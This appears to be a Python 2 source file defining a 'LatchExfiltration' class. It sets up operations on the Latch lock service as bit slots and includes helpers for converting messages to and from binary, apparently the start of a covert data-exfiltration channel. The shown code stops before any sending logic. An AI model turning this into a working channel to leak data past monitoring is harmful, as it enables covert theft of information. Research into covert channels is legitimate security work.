# -*- coding: utf-8 -*-
import latch_interface
import time
import binascii
import collections

class LatchExfiltration(object):

    latches = ['1', '2', '3', '4', '5', '6', '7', '8', 'control', 'reader', 'end']

    def __init__(self, account_id=None):
        self.latch = latch_interface.LatchInterface(account_id)
        self.dict_converted = self.start_exfiltration()

    # Initiation
    def clean_exfiltration(self):
        '''
        Delete all operations and re-create them in order to have a clean start
        '''
        operations = self.latch.getOperations()
        for key, value in operations.iteritems():
            self.latch.deleteOperation(key)
        for latch in self.latches:
            self.latch.createOperation(latch)

    def start_exfiltration(self):
        operations_new = self.latch.getOperations()
        operations_check = [value.get('name', '') for (key, value) in operations_new.iteritems()]
        if collections.Counter(operations_check) != collections.Counter(self.latches): # cambiar a comprobar que sean lo mismo
            self.clean_exfiltration()
            operations_new = self.latch.getOperations()
        dict_converted = self.convert_response(operations_new)
        self.latch.unlockAll(dict_converted)
        return dict_converted

    def convert_response(self, operations):
        dict_sorted = {value.get('name', '') : key for (key, value) in operations.iteritems()}
        return dict_sorted

    def read_string_to_byte(self, message):
        bits_converted = [format(x, 'b') for x in bytearray(message)]
        bits_fixed = [('0' * (8 - len(byte))) + byte for idx, byte in enumerate(bits_converted)]
        return bits_fixed

    def ascii_to_string(self, ascii):
        value = int(ascii, 2)
        return binascii.unhexlify('%x' % value)